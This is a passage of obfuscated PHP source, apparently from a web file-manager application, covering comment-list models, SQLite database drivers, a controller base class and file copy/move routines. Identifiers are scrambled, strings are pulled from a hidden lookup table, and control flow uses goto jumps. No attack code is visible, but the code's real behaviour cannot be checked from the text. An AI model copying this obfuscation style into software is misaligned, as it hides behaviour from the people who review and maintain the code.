$¢ûÅ±„ï))->setAdd($ŒùòÊ”Û[2001], 1); } else { $‰×ŒË¤->where($± °ÙÓÄ)->delete(); $ñùÕé¯ = $this->where(array($ŒùòÊ”Û[1999] => $¢ûÅ±„ï))->setAdd($ŒùòÊ”Û[2001], -1); } return $ñùÕé¯; } public function targetInfo($ö½·‚Çä, $½‘¬ÚØ…) { $ñÚÄ„ŠÑ =& $_SERVER[ç¦¬”œš]; $Ñ÷©í¿ = array($ñÚÄ„ŠÑ[657] => $ö½·‚Çä, $ñÚÄ„ŠÑ[658] => $½‘¬ÚØ…); $™ğ¸Òİ¼ = $this->where($Ñ÷©í¿)->count(); $©¼ä×‰Ô = "\x52\111\107\110\x54\x20\x4a\117\x49\116\40{$this->tablePrefix}\x63\x6f\x6d\155\x65\156\x74\x5f\160\162\141\x69\163\x65\x20\x73\x74\141\x72\40\157\156\40\143\x6f\x6d\x6d\145\x6e\164\56\x63\x6f\x6d\155\x65\x6e\164\111\104\40\75\40\x73\164\141\x72\56\x63\x6f\x6d\x6d\x65\x6e\164\111\104"; $´ş‘¯ÆÏ = $this->alias($ñÚÄ„ŠÑ[430])->where($Ñ÷©í¿)->join($©¼ä×‰Ô, $ñÚÄ„ŠÑ[2010])->count(); $ÏÜûÜŞ = array($ñÚÄ„ŠÑ[2011] => $™ğ¸Òİ¼, $ñÚÄ„ŠÑ[2012] => $´ş‘¯ÆÏ); return $ÏÜûÜŞ; } public function listData($¾ĞŸµ„) { $²†Çğ =& $_SERVER[ç¦¬”œš]; if (isset($¾ĞŸµ„[$²†Çğ[2013]])) { if ($¾ĞŸµ„[$²†Çğ[2013]]) { $¾ĞŸµ„[$²†Çğ[2006]] = array($²†Çğ[1093], intval($¾ĞŸµ„[$²†Çğ[2013]])); } unset($¾ĞŸµ„[$²†Çğ[2013]]); } if (isset($¾ĞŸµ„[$²†Çğ[2014]])) { if ($¾ĞŸµ„[$²†Çğ[2014]]) { $¾ĞŸµ„[$²†Çğ[2006]] = array($²†Çğ[1090], intval($¾ĞŸµ„[$²†Çğ[2014]])); } unset($¾ĞŸµ„[$²†Çğ[2014]]); } return $this->_listData($¾ĞŸµ„); } private function _listData($çˆÇÍÉ) { $Ó¤íø‰ =& $_SERVER[ç¦¬”œš]; $ïæ°•½ç = $this->where($çˆÇÍÉ)->_makeOrder()->selectPage(100); $this->_listAppendParent($ïæ°•½ç[$Ó¤íø‰[445]]); $this->_listAppendUser($ïæ°•½ç[$Ó¤íø‰[445]]); $this->_listAppendMeta($ïæ°•½ç[$Ó¤íø‰[445]]); return $ïæ°•½ç; } private function _makeOrder() { $ ÒÊÙ¾ =& $_SERVER[ç¦¬”œš]; $¼ù—¸ë– = array($ ÒÊÙ¾[2001], $ ÒÊÙ¾[2000], $ ÒÊÙ¾[231]); $äğ®¥¦Ú = Input::get($ ÒÊÙ¾[539], $ ÒÊÙ¾[7], $ ÒÊÙ¾[506], $¼ù—¸ë–); $ Îá«ş = Input::get($ ÒÊÙ¾[540], $ ÒÊÙ¾[7], $ ÒÊÙ¾[1763], array($ ÒÊÙ¾[2015], $ ÒÊÙ¾[535])); $¬—÷¾ = $äğ®¥¦Ú . $ ÒÊÙ¾[53] . $ Îá«ş; return $this->order($¬—÷¾); } private function _listAppendParent(&$­§™æù) { $¨·™åû =& $_SERVER[ç¦¬”œš]; $§ãİ×†ˆ = array_unique(array_to_keyvalue($­§™æù, $¨·™åû[12], $¨·™åû[1998])); $§ãİ×†ˆ = array_remove_value($§ãİ×†ˆ, $¨·™åû[228]); if (!$§ãİ×†ˆ) { return; } $©ÌåéòÆ = $this->where(array($¨·™åû[1999] => array($¨·™åû[7], $§ãİ×†ˆ)))->select(); $©ÌåéòÆ = array_to_keyvalue($©ÌåéòÆ, $¨·™åû[2006]); foreach ($­§™æù as &$ì•­ëá¸) { if (isset($©ÌåéòÆ[$ì•­ëá¸[$¨·™åû[1998]]])) { $ì•­ëá¸[$¨·™åû[2016]] = $©ÌåéòÆ[$ì•­ëá¸[$¨·™åû[1998]]]; } } unset($ì•­ëá¸); } private function _listAppendUser(&$·¶ØÃß) { $îëêÆÒ¡ =& $_SERVER[ç¦¬”œš]; $Ó·Æ“ÄŒ = array_unique(array_to_keyvalue($·¶ØÃß, $îëêÆÒ¡[12], $îëêÆÒ¡[1770])); $Ó·Æ“ÄŒ = array_remove_value($Ó·Æ“ÄŒ, $îëêÆÒ¡[228]); if (count($Ó·Æ“ÄŒ) == 0) { return; } foreach ($·¶ØÃß as $ìçÔ¡µ¢) { if (isset($ìçÔ¡µ¢[$îëêÆÒ¡[2016]])) { $Ó·Æ“ÄŒ[] = $ìçÔ¡µ¢[$îëêÆÒ¡[2016]][$îëêÆÒ¡[1770]]; } } $·ğïø¼† = Model($îëêÆÒ¡[607])->userListInfo($Ó·Æ“ÄŒ); foreach ($·¶ØÃß as &$ìçÔ¡µ¢) { $ìçÔ¡µ¢[$îëêÆÒ¡[671]] = $·ğïø¼†[$ìçÔ¡µ¢[$îëêÆÒ¡[1770]]]; if (isset($ìçÔ¡µ¢[$îëêÆÒ¡[2016]])) { $ìçÔ¡µ¢[$îëêÆÒ¡[2016]][$îëêÆÒ¡[671]] = $·ğïø¼†[$ìçÔ¡µ¢[$îëêÆÒ¡[2016]][$îëêÆÒ¡[1770]]]; } } unset($ìçÔ¡µ¢); } private function _listAppendMeta(&$ïÊ¦¾ã) { $ÊÃù« =& $_SERVER[ç¦¬”œš]; $ï’¨ƒ‚ = array_unique(array_to_keyvalue($ïÊ¦¾ã, $ÊÃù«[12], $ÊÃù«[2006])); $ï’¨ƒ‚ = array_remove_value($ï’¨ƒ‚, $ÊÃù«[228]); if (!$ï’¨ƒ‚) { return; } foreach ($ïÊ¦¾ã as $ƒÅ¶İ) { if (isset($ƒÅ¶İ[$ÊÃù«[2016]])) { $ï’¨ƒ‚[] = $ƒÅ¶İ[$ÊÃù«[2016]][$ÊÃù«[2006]]; } } $àª¦ØÍ¯ = $this->metaList($ï’¨ƒ‚); if (!$àª¦ØÍ¯) { return !1; } foreach ($ïÊ¦¾ã as &$ƒÅ¶İ) { $ƒÅ¶İ[$ÊÃù«[548]] = $àª¦ØÍ¯[$ƒÅ¶İ[$ÊÃù«[2006]]]; if (isset($ƒÅ¶İ[$ÊÃù«[2016]])) { $ƒÅ¶İ[$ÊÃù«[2016]][$ÊÃù«[548]] = $àª¦ØÍ¯[$ƒÅ¶İ[$ÊÃù«[2016]][$ÊÃù«[2006]]]; } } unset($ƒÅ¶İ); } private function metaList($ú„üı°˜) { $…ºÉ°» =& $_SERVER[ç¦¬”œš]; if (!$ú„üı°˜) { return array(); } $§½¡¸½ = array($…ºÉ°»[2006] => array($…ºÉ°»[7], $ú„üı°˜)); $’ç¯ È‘ = Model($…ºÉ°»[2017])->where($§½¡¸½)->select(); $’ç¯ È‘ = array_to_keyvalue_group($’ç¯ È‘, $…ºÉ°»[2006]); foreach ($’ç¯ È‘ as $ˆï¦ş™Î => $¯±µ) { $ş‰†¼Èå = array(); foreach ($¯±µ as $ß‚‰êíä) { $ş‰†¼Èå[$ß‚‰êíä[$…ºÉ°»[97]]] = $ß‚‰êíä[$…ºÉ°»[450]]; } $’ç¯ È‘[$ˆï¦ş™Î] = $ş‰†¼Èå; } return $’ç¯ È‘ ? $’ç¯ È‘ : array(); } public function removeTarget($½¢ •Î, $ò•ÀŒ¼¡) { $Ÿ¶ÀÕ»œ =& $_SERVER[ç¦¬”œš]; if (!$ò•ÀŒ¼¡) { return !0; } $ò•ÀŒ¼¡ = is_array($ò•ÀŒ¼¡) ? $ò•ÀŒ¼¡ : array($ò•ÀŒ¼¡); $Øè„·ğà = array($Ÿ¶ÀÕ»œ[190] => $½¢ •Î, $Ÿ¶ÀÕ»œ[578] => array($Ÿ¶ÀÕ»œ[7], $ò•ÀŒ¼¡)); $µè·Ú×Ä = $this->field($Ÿ¶ÀÕ»œ[2006])->where($Øè„·ğà)->select(); $œ¦™ãˆğ = array_to_keyvalue($µè·Ú×Ä, $Ÿ¶ÀÕ»œ[12], $Ÿ¶ÀÕ»œ[2006]); if (!$œ¦™ãˆğ) { return !0; } $Øè„·ğà = array($Ÿ¶ÀÕ»œ[2006] => array($Ÿ¶ÀÕ»œ[7], $œ¦™ãˆğ)); $this->where($Øè„·ğà)->delete(); Model($Ÿ¶ÀÕ»œ[2009])->where($Øè„·ğà)->delete(); Model($Ÿ¶ÀÕ»œ[2018])->where($Øè„·ğà)->delete(); } } goto cš«°ÒÖÑÅ; B‡ª¾Ãßá: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $éäëëª =& $_SERVER[ç¦¬”œš]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$éäëëª[6]] =& $config; $this->values[$éäëëª[7]] =& $in; $this->tpl = TEMPLATE . MOD . $éäëëª[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ªá‹ùÂ€) { if (1 === func_num_args()) { $this->{$ªá‹ùÂ€} = new $ªá‹ùÂ€(); } else { $Ô˜Æ»É = new ReflectionClass($ªá‹ùÂ€); $ó—ßŠÔ = func_get_args(); array_shift($ó—ßŠÔ); $this->{$ªá‹ùÂ€} = $Ô˜Æ»É->newInstanceArgs($ó—ßŠÔ); } return $this->{$ªá‹ùÂ€}; } public function routeBind($Ô®ú±™ñ, $–™µı›„, $óÜ®®›“ = 3) { $èÚ³úÓØ =& $_SERVER[ç¦¬”œš]; $Õò”‹¨Î = $this->in[$èÚ³úÓØ[9]]; $Ô®ú±™ñ = str_replace($èÚ³úÓØ[10], $èÚ³úÓØ[11], trim(trim($Ô®ú±™ñ, $èÚ³úÓØ[8]), $èÚ³úÓØ[12])); if (!$Ô®ú±™ñ || count($Õò”‹¨Î) <= $óÜ®®›“) { return !1; } $°à½õÁ = !0; $ğ»à¼‚„ = explode($èÚ³úÓØ[8], $Ô®ú±™ñ); for ($î®é²åÂ = 0; $î®é²åÂ < count($ğ»à¼‚„); $î®é²åÂ++) { if ($ğ»à¼‚„[$î®é²åÂ] != $Õò”‹¨Î[$óÜ®®›“ + $î®é²åÂ]) { $°à½õÁ = !1; break; } } if (!$°à½õÁ) { return; } call_user_func_array(array($this, $–™µı›„), array()); } public function routeArgs($Š—îÀÜ = 3) { $•‹Ç¶ªà = $this->in[$_SERVER[ç¦¬”œš][9]]; if (count($•‹Ç¶ªà) <= $Š—îÀÜ) { return array(); } $»Éôâ†û = array(); for ($˜ãôâê = $Š—îÀÜ; $˜ãôâê < count($•‹Ç¶ªà); $˜ãôâê += 2) { $»Éôâ†û[$•‹Ç¶ªà[$˜ãôâê]] = $•‹Ç¶ªà[$˜ãôâê + 1]; $this->in[$•‹Ç¶ªà[$˜ãôâê]] = $•‹Ç¶ªà[$˜ãôâê + 1]; } return $»Éôâ†û; } protected function assign($àÁ‡ÃÎ, $Ú«—ÌÃÄ) { $this->values[$àÁ‡ÃÎ] = $Ú«—ÌÃÄ; } protected function display($ì¨êŒõô) { ob_end_clean(); extract($this->values); require $this->tpl . $ì¨êŒõô; } } class DbSqliteBase extends Db { public function __construct($ä¤¿²¬¿ = '') { $Î¸¥õœˆ =& $_SERVER[ç¦¬”œš]; if (!extension_loaded($Î¸¥õœˆ[13])) { think_exception(think_lang($Î¸¥õœˆ[14]) . $Î¸¥õœˆ[15]); } if (!empty($ä¤¿²¬¿)) { if (!isset($ä¤¿²¬¿[$Î¸¥õœˆ[16]])) { $ä¤¿²¬¿[$Î¸¥õœˆ[16]] = 438; } $this->config = $ä¤¿²¬¿; if (empty($this->config[$Î¸¥õœˆ[17]])) { $this->config[$Î¸¥õœˆ[17]] = array(); } } } public function connect($›•Ÿ³²œ = '', $”ˆ±›Ê = 0) { $êª‹Ïİ =& $_SERVER[ç¦¬”œš]; if (!isset($this->linkID[$”ˆ±›Ê])) { if (empty($›•Ÿ³²œ)) { $›•Ÿ³²œ = $this->config; } $Àã®Ô“Ô = !empty($›•Ÿ³²œ[$êª‹Ïİ[17]][$êª‹Ïİ[18]]) ? $›•Ÿ³²œ[$êª‹Ïİ[17]][$êª‹Ïİ[18]] : $this->pconnect; $ï¸£‘º½ = $Àã®Ô“Ô ? $êª‹Ïİ[19] : $êª‹Ïİ[20]; $this->linkID[$”ˆ±›Ê] = $ï¸£‘º½($›•Ÿ³²œ[$êª‹Ïİ[21]], $›•Ÿ³²œ[$êª‹Ïİ[16]]); if (!$this->linkID[$”ˆ±›Ê]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$”ˆ±›Ê], 30000); if (1 != think_config($êª‹Ïİ[22])) { unset($this->config); } } return $this->linkID[$”ˆ±›Ê]; } public function free() { $this->queryID = null; } public function query($Ô¿ºªÖº) { $µı¨ˆÛÚ =& $_SERVER[ç¦¬”œš]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ô¿ºªÖº; if ($this->queryID) { $this->free(); } think_action_status($µı¨ˆÛÚ[23], 1); think_status($µı¨ˆÛÚ[24]); $this->queryID = sqlite_query($this->_linkID, $Ô¿ºªÖº); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $¯±–üÙ‰ = $this->getAll(); return $¯±–üÙ‰; } } public function execute($¬¼ÌËìà) { $ƒ¾â»¡ó =& $_SERVER[ç¦¬”œš]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¬¼ÌËìà; if ($this->queryID) { $this->free(); } think_action_status($ƒ¾â»¡ó[25], 1); think_status($ƒ¾â»¡ó[24]); $òÅÀ—ƒ = sqlite_exec($this->_linkID, $¬¼ÌËìà); $this->debug(); if (!1 === $òÅÀ—ƒ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ç¦¬”œš][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ıÈ¸ŠÌŸ = sqlite_query($this->_linkID, $_SERVER[ç¦¬”œš][27]); if (!$ıÈ¸ŠÌŸ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Àö‡²ó½ = sqlite_query($this->_linkID, $_SERVER[ç¦¬”œš][28]); if (!$Àö‡²ó½) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¬ƒŸİĞ± = array(); if ($this->numRows > 0) { for ($óäâÑÉ© = 0; $óäâÑÉ© < $this->numRows; $óäâÑÉ©++) { $¬ƒŸİĞ±[$óäâÑÉ©] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $¬ƒŸİĞ±; } public function getFields($¼è×Îñ¸) { $»Šó‚ÕÁ =& $_SERVER[ç¦¬”œš]; $ŒŸ›ãã€ = $this->query($»Šó‚ÕÁ[29] . $¼è×Îñ¸ . $»Šó‚ÕÁ[30]); $°ôÆÁËÊ = array(); if ($ŒŸ›ãã€) { foreach ($ŒŸ›ãã€ as $úÖ×‹ÚÆ => $¤şÄÙÎ) { $°ôÆÁËÊ[$¤şÄÙÎ[$»Šó‚ÕÁ[31]]] = array($»Šó‚ÕÁ[32] => $¤şÄÙÎ[$»Šó‚ÕÁ[31]], $»Šó‚ÕÁ[33] => $¤şÄÙÎ[$»Šó‚ÕÁ[34]], $»Šó‚ÕÁ[35] => (bool) ($¤şÄÙÎ[$»Šó‚ÕÁ[36]] === $»Šó‚ÕÁ[12]), $»Šó‚ÕÁ[37] => $¤şÄÙÎ[$»Šó‚ÕÁ[38]], $»Šó‚ÕÁ[39] => strtolower($¤şÄÙÎ[$»Šó‚ÕÁ[40]]) == $»Šó‚ÕÁ[41], $»Šó‚ÕÁ[42] => strtolower($¤şÄÙÎ[$»Šó‚ÕÁ[43]]) == $»Šó‚ÕÁ[44]); } } return $°ôÆÁËÊ; } public function getTables($íòˆ»† = '') { $Ó˜‰îİ° =& $_SERVER[ç¦¬”œš]; $ŠŸ×¦§® = $this->query($Ó˜‰îİ°[45] . $Ó˜‰îİ°[46] . $Ó˜‰îİ°[47]); $»Ÿ¦Ì„¼ = array(); foreach ($ŠŸ×¦§® as $¸òæò¢‰ => $±æù„€¤) { $»Ÿ¦Ì„¼[$¸òæò¢‰] = current($±æù„€¤); } return $»Ÿ¦Ì„¼; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $³Ôù›Î =& $_SERVER[ç¦¬”œš]; $•ı–òÕØ = sqlite_last_error($this->_linkID); $this->error = $•ı–òÕØ . $³Ôù›Î[4] . sqlite_error_string($•ı–òÕØ); if ($³Ôù›Î[12] != $this->queryStr) { $this->error .= LNG($³Ôù›Î[48]) . $this->queryStr; } think_trace($this->error, $³Ôù›Î[12], $³Ôù›Î[49]); return $this->error; } public function escapeString($ ‡»…İÒ) { return sqlite_escape_string($ ‡»…İÒ); } public function parseLimit($®«‚æã) { $ßìüöãî =& $_SERVER[ç¦¬”œš]; $×õ‡íŸ§ = $ßìüöãî[12]; if (!empty($®«‚æã)) { $®«‚æã = explode($ßìüöãî[50], $®«‚æã); if (count($®«‚æã) > 1) { $×õ‡íŸ§ .= $ßìüöãî[51] . $®«‚æã[1] . $ßìüöãî[52] . $®«‚æã[0] . $ßìüöãî[53]; } else { $×õ‡íŸ§ .= $ßìüöãî[51] . $®«‚æã[0] . $ßìüöãî[53]; } } return $×õ‡íŸ§; } } class DbSqlite3Base extends Db { public function __construct($Ü¤¥–Ïô = '') { $ø×Ä²–Ä =& $_SERVER[ç¦¬”œš]; if (!class_exists($ø×Ä²–Ä[54])) { think_exception(think_lang($ø×Ä²–Ä[14]) . $ø×Ä²–Ä[55]); } if (!empty($Ü¤¥–Ïô)) { if (!isset($Ü¤¥–Ïô[$ø×Ä²–Ä[16]])) { $Ü¤¥–Ïô[$ø×Ä²–Ä[16]] = 438; } $this->config = $Ü¤¥–Ïô; if (empty($this->config[$ø×Ä²–Ä[17]])) { $this->config[$ø×Ä²–Ä[17]] = array(); } } } public function connect($ëÒÀ‡»ú = '', $âÃê‡å = 0) { $òØ‹æ÷ˆ =& $_SERVER[ç¦¬”œš]; if (!isset($this->linkID[$âÃê‡å])) { if (empty($ëÒÀ‡»ú)) { $ëÒÀ‡»ú = $this->config; } $this->linkID[$âÃê‡å] = new SQLite3($ëÒÀ‡»ú[$òØ‹æ÷ˆ[21]]); if (!$this->linkID[$âÃê‡å]) { think_exception($this->linkID[$âÃê‡å]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$âÃê‡å]->busyTimeout(30000); if (1 != think_config($òØ‹æ÷ˆ[22])) { unset($this->config); } } return $this->linkID[$âÃê‡å]; } public function free() { $this->queryID = null; } public function query($ìÒ™™ôŞ) { $è£Å¢¨º =& $_SERVER[ç¦¬”œš]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ìÒ™™ôŞ; if ($this->queryID) { $this->free(); } think_action_status($è£Å¢¨º[23], 1); think_status($è£Å¢¨º[24]); $this->queryID = $this->_linkID->query($ìÒ™™ôŞ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ïŞºµ½È = $this->getAll(); $this->numRows = count($ïŞºµ½È); return $ïŞºµ½È; } } public function execute($öØÕîú) { $ûÚ÷¢š” =& $_SERVER[ç¦¬”œš]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $öØÕîú; if ($this->queryID) { $this->free(); } think_action_status($ûÚ÷¢š”[25], 1); think_status($ûÚ÷¢š”[24]); $ù‚¯¬ßè = $this->_linkID->exec($öØÕîú); $this->debug(); if (!1 === $ù‚¯¬ßè) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ç¦¬”œš][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $´Î»ìÆÜ = $this->_linkID->query($_SERVER[ç¦¬”œš][27]); if (!$´Î»ìÆÜ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $»üğ‘¦¬ = $this->_linkID->query($_SERVER[ç¦¬”œš][28]); if (!$»üğ‘¦¬) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Œ•ø–©İ = array(); while ($¸®íèØ… = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Œ•ø–©İ[] = $¸®íèØ…; } $this->queryID->reset(); return $Œ•ø–©İ; } public function getFields($ßƒ’­¿­) { $Åë‘­èœ =& $_SERVER[ç¦¬”œš]; $š¢µ—óš = $this->query($Åë‘­èœ[29] . $ßƒ’­¿­ . $Åë‘­èœ[30]); $©øˆµ’› = array(); if ($š¢µ—óš) { foreach ($š¢µ—óš as $ßëòÑŞ => $’¤ëìñ‹) { $©øˆµ’›[$’¤ëìñ‹[$Åë‘­èœ[32]]] = array($Åë‘­èœ[32] => $’¤ëìñ‹[$Åë‘­èœ[32]], $Åë‘­èœ[33] => $’¤ëìñ‹[$Åë‘­èœ[33]], $Åë‘­èœ[35] => (bool) ($’¤ëìñ‹[$Åë‘­èœ[35]] === $Åë‘­èœ[12]), $Åë‘­èœ[37] => $’¤ëìñ‹[$Åë‘­èœ[56]], $Åë‘­èœ[39] => (bool) $’¤ëìñ‹[$Åë‘­èœ[57]], $Åë‘­èœ[42] => (bool) $’¤ëìñ‹[$Åë‘­èœ[57]]); } } return $©øˆµ’›; } public function getTables($Àù½±×İ = '') { $Í¨õùåÃ =& $_SERVER[ç¦¬”œš]; $ı¤Âë‚ = $this->query($Í¨õùåÃ[45] . $Í¨õùåÃ[46] . $Í¨õùåÃ[47]); $ñü…İ‰ = array(); foreach ($ı¤Âë‚ as $ë·êÛïó => $Ê¿ÁİÉ¯) { $ñü…İ‰[$ë·êÛïó] = current($Ê¿ÁİÉ¯); } return $ñü…İ‰; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ĞÜ£°¦Ì =& $_SERVER[ç¦¬”œš]; $this->error = $this->_linkID->lastErrorMsg(); if ($ĞÜ£°¦Ì[12] != $this->queryStr) { $this->error .= LNG($ĞÜ£°¦Ì[48]) . $this->queryStr; } think_trace($this->error, $ĞÜ£°¦Ì[12], $ĞÜ£°¦Ì[49]); return $this->error; } public function escapeString($–ºñ“ƒú) { $Â—¸–¢ =& $_SERVER[ç¦¬”œš]; if ($this->_linkID) { return $this->_linkID->escapeString($–ºñ“ƒú); } return str_ireplace($Â—¸–¢[58], $Â—¸–¢[59], $–ºñ“ƒú); } public function parseLimit($ıÌº·Š ) { $©¸Îğ‡† =& $_SERVER[ç¦¬”œš]; $¬ëŞƒÆû = $©¸Îğ‡†[12]; if (!empty($ıÌº·Š )) { $ıÌº·Š  = explode($©¸Îğ‡†[50], $ıÌº·Š ); if (count($ıÌº·Š ) > 1) { $¬ëŞƒÆû .= $©¸Îğ‡†[51] . $ıÌº·Š [1] . $©¸Îğ‡†[52] . $ıÌº·Š [0] . $©¸Îğ‡†[53]; } else { $¬ëŞƒÆû .= $©¸Îğ‡†[51] . $ıÌº·Š [0] . $©¸Îğ‡†[53]; } } return $¬ëŞƒÆû; } } goto E÷ç¬®ƒ¬; E÷ïÂ‚Ç¨: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($òáÑŞ™, $Ç÷ÄÈ“ü) { $ÄÛ‡¡ğñ =& $_SERVER[ç¦¬”œš]; $İ–ùäšà = $Ç÷ÄÈ“ü; $GLOBALS[$ÄÛ‡¡ğñ[1228]] = $ÄÛ‡¡ğñ[1229] . $òáÑŞ™; Hook::trigger($ÄÛ‡¡ğñ[1229] . $òáÑŞ™ . $ÄÛ‡¡ğñ[1230], $İ–ùäšà); $¶º¬éÏ£ = self::driverMake($Ç÷ÄÈ“ü[0]); if (!$¶º¬éÏ£) { return !1; } if (method_exists($¶º¬éÏ£, $òáÑŞ™)) { $¡¨ëŒš… = @call_user_func_array(array($¶º¬éÏ£, $òáÑŞ™), $Ç÷ÄÈ“ü); } else { if (method_exists($¶º¬éÏ£, $ÄÛ‡¡ğñ[1231])) { $¡¨ëŒš… = @call_user_func_array(array($¶º¬éÏ£, $òáÑŞ™), $Ç÷ÄÈ“ü); } else { if (method_exists(self, $òáÑŞ™)) { $¡¨ëŒš… = @call_user_func_array(array(self, $òáÑŞ™), $Ç÷ÄÈ“ü); } else { $¡¨ëŒš… = call_user_func_array(array(parent, $òáÑŞ™), $Ç÷ÄÈ“ü); } } } Hook::trigger($ÄÛ‡¡ğñ[1229] . $òáÑŞ™ . $ÄÛ‡¡ğñ[1232], $İ–ùäšà, $¡¨ëŒš…); return $¡¨ëŒš…; } public static function init($ğï²İ¦º) { return self::driverMake($ğï²İ¦º); } public static function copy($ùš±„È, $Ü•Â¸±“, $˜ÁÈÒ™ = false, $ö§ö·›¿ = false) { return self::copyMoveStart($ùš±„È, $Ü•Â¸±“, $˜ÁÈÒ™, $_SERVER[ç¦¬”œš][627], $ö§ö·›¿); } public static function move($÷‚˜¦¨á, $Š¾Ÿğ‹â, $ÕöÇ²²ş = false, $ÓÕåë  = false) { return self::copyMoveStart($÷‚˜¦¨á, $Š¾Ÿğ‹â, $ÕöÇ²²ş, $_SERVER[ç¦¬”œš][629], $ÓÕåë ); } private static function copyMoveStart($µÁÙ™‹œ, $ÒÑŸ”İ, $½¡÷íàï, $Ğ¼ïˆ—, $Ûøİœùø) { $äª˜¯ÜÍ =& $_SERVER[ç¦¬”œš]; $ş¾–ç¨ = array($µÁÙ™‹œ, $ÒÑŸ”İ, $½¡÷íàï, $Ûøİœùø); Hook::trigger($äª˜¯ÜÍ[1229] . $Ğ¼ïˆ— . $äª˜¯ÜÍ[1230], $ş¾–ç¨); $±¡©Óøƒ = self::copyMove($µÁÙ™‹œ, $ÒÑŸ”İ, $½¡÷íàï, $Ğ¼ïˆ—, $Ûøİœùø); Hook::trigger($äª˜¯ÜÍ[1229] . $Ğ¼ïˆ— . $äª˜¯ÜÍ[1232], $ş¾–ç¨, $±¡©Óøƒ); return $±¡©Óøƒ; } public static function saveFile($¯«Ùí§œ, $¼÷¨ïÈ, $±¡Ì—¼¸ = true) { $Ôìö =& $_SERVER[ç¦¬”œš]; $÷‘“ßçŸ = self::info($¼÷¨ïÈ); $ô³äıØ® = self::driverMake($¯«Ùí§œ); $Âãı¢‹Ó = self::driverMake($¼÷¨ïÈ); $ë£ßï”ë = !1; if ($Âãı¢‹Ó->pathParse[$Ôìö[1233]]) { $ë£ßï”ë = $Âãı¢‹Ó; $¤ÆÇÌŠ­ = $Âãı¢‹Ó->pathParse[$Ôìö[1233]]; $Âãı¢‹Ó = self::driverMake($¤ÆÇÌŠ­); } if ($ô³äıØ®->pathParse[$Ôìö[1233]]) { $û‡½‘“ì = $ô³äıØ®->pathParse[$Ôìö[1233]]; $ô³äıØ® = self::driverMake($û‡½‘“ì); } $ßçúó‚Ô = $Âãı¢‹Ó->pathFather($¼÷¨ïÈ); $¥­îä· = !0; if (!$±¡Ì—¼¸ && self::driverIsSame($ô³äıØ®, $Âãı¢‹Ó)) { $¥­îä· = !1; } $ğ÷Ù¤ßÏ = self::copyFile($ô³äıØ®, $¯«Ùí§œ, $Âãı¢‹Ó, $ßçúó‚Ô, $÷‘“ßçŸ[$Ôìö[32]], $¥­îä·); if ($ë£ßï”ë) { $ğ÷Ù¤ßÏ = $ë£ßï”ë->getPathOuter($ğ÷Ù¤ßÏ); } return $ğ÷Ù¤ßÏ; } private static function copyMove($èøä¢Õ«, $ê¥›€ğè, $ÀÅÍ”ı™, $‘åşĞÙÖ, $“öÇÈì = false) { $áÂşªŞ =& $_SERVER[ç¦¬”œš]; if (!$èøä¢Õ« || $èøä¢Õ« == $áÂşªŞ[8] || !$ê¥›€ğè) { return !1; } ignore_timeout(); $íÕ¤÷° = self::driverMake($èøä¢Õ«); $ûû’Ïƒ = self::driverMake($ê¥›€ğè); $ö“½¨ü³ = $‘åşĞÙÖ == $áÂşªŞ[629]; $§Ó×½¹È = !1; if ($ûû’Ïƒ->pathParse[$áÂşªŞ[1233]]) { $§Ó×½¹È = $ûû’Ïƒ; $ê¥›€ğè = $ûû’Ïƒ->pathParse[$áÂşªŞ[1233]]; $ûû’Ïƒ = self::driverMake($ê¥›€ğè); } if ($íÕ¤÷°->pathParse[$áÂşªŞ[1233]]) { $èøä¢Õ« = $íÕ¤÷°->pathParse[$áÂşªŞ[1233]]; $íÕ¤÷° = self::driverMake($èøä¢Õ«); } self::check($íÕ¤÷°, $èøä¢Õ«, $ûû’Ïƒ, $ê¥›€ğè); Hook::trigger($áÂşªŞ[1234], $íÕ¤÷°, $èøä¢Õ«, $ûû’Ïƒ, $ê¥›€ğè); $å¶¶û¶ø = self::driverIsSame($íÕ¤÷°, $ûû’Ïƒ); if ($å¶¶û¶ø) { if ($‘åşĞÙÖ == $áÂşªŞ[629] && !method_exists($ûû’Ïƒ, $áÂşªŞ[1235]) && trim($ê¥›€ğè, $áÂşªŞ[8]) == trim($ûû’Ïƒ->pathFather($èøä¢Õ«), $áÂşªŞ[8])) { if ($íÕ¤÷°->pathThis($èøä¢Õ«) != $“öÇÈì && !$íÕ¤÷°->isOsDriver()) { return $íÕ¤÷°->rename($èøä¢Õ«, $“öÇÈì); } return 